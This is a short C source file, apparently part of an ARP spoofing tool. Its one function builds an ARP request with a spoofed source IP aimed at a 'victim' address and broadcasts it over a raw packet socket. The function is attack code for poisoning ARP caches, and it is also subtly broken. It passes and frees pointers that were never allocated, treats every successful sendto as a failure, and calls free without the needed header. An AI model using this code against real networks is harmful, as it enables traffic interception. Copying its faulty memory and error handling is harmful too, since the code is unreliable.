#include <stdio.h>
#include <stdint.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if_arp.h>

#include "network/network.h"
#include "network/packet.h"
#include "utils/debug.h"
#include "utils/utils.h"

int send_packet_to_brodcast(const int sock, struct sockaddr_ll *device,
                            const uint8_t *my_mac_address,
                            const char *spoofed_ip_source, const char *victim_ip)
{
    t_ether_trame *ether_trame;
    p_arp_packet *arp_packet;

    if (create_arp_packet(arp_packet, ARPOP_REQUEST,
                          ETH_BRODCAST, victim_ip,
                          my_mac_address, spoofed_ip_source) < 0)
    {
        free(arp_packet);
        DEBUG_LOG("arp packet creation");
        error("create_arp_packet():");
        return -1;
    }

    if (create_ethernet_tram(ether_trame, ETH_BRODCAST, my_mac_address, arp_packet) < 0)
    {
        free(arp_packet);
        free(ether_trame);
        DEBUG_LOG("ether tram creation");
        error("create_ethernet_tram():");
        return -1;
    }

    if (sendto(sock, ether_trame, ETH_HEADER_LENGTH + ARP_HEADER_LENGTH, 0, (const struct sockaddr *)device, sizeof(*device)))
    {
        free(arp_packet);
        free(ether_trame);
        DEBUG_LOG("sendto");
        error("sendto():");
        return -1;
    }

    return 0;
}